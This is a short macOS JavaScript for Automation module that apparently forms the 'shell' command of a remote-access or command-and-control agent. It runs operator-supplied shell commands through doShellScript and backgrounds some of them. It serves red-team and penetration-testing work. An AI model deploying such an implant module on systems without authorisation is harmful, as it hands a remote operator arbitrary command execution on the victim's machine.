exports.shell = function(task, command, params){
	//simply run a shell command via doShellScript and return the response
	let response = "";
	try{
		let command_params = JSON.parse(params);
		let command = command_params['command'];
	    if(command[command.length-1] === "&"){
	        //doShellScript actually does macOS' /bin/sh which is actually bash emulating sh
	        //  so to actually background a task, you need "&> /dev/null &" at the end
	        //  so I'll just automatically fix this so it's not weird for the operator
	        command = command + "> /dev/null &";
	    }
		response = currentApp.doShellScript(command);
		if(response === undefined || response === ""){
		    response = "No Command Output";
		}
		// shell output uses \r instead of \n or \r\n to line endings, fix this nonsense
		response = response.replace(/\r/g, "\n");
		return {"user_output":response, "completed": true};
	}
	catch(error){
		response = error.toString().replace(/\r/g, "\n");
		return {"user_output":response, "completed": true, "status": "error"};
	}
};
